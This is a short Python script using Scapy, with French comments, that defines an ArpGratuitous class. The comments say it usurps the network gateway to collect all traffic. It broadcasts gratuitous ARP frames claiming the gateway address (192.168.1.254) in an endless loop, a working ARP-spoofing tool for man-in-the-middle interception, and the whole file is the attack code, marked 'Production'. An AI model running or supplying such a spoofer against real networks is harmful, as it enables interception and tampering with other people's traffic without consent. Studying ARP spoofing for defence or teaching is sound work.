from scapy.all import sendp
from scapy.layers.l2 import Ether, ARP
import time
__author__ = "Chauvin Antoine"
__copyright__ = ""
__credits__ = ["Chauvin Antoine"]
__license__ = ""
__version__ = "1.0"
__maintainer__ = "Chauvin Antoine"
__email__ = "antoine.chauvin@live.fr"
__status__ = "Production"


class ArpGratuitous:
    """
    On définis une classe ArpGratuitous qui se chargera
    d'usurper la passerelle afin de recueillir l'ensemble
    du traffic
    """
    def __init__(self, gateway, interval=2):
        self.interval = interval
        self.gateway = gateway

    def start(self) -> None:
        """
        Méthode de classe principale qui se contente de lancer le spoofing
        """
        # On envoie une trame à l'ensemble du réseau pour indiquer que l'on fait office de passerelle
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", psrc=self.gateway, pdst=self.gateway, hwdst="ff:ff:ff:ff:ff:ff")

        while True:
            sendp(packet)
            time.sleep(self.interval)


if __name__ == "__main__":
    my_spoofer = ArpGratuitous(gateway="192.168.1.254", interval=2)
    my_spoofer.start()
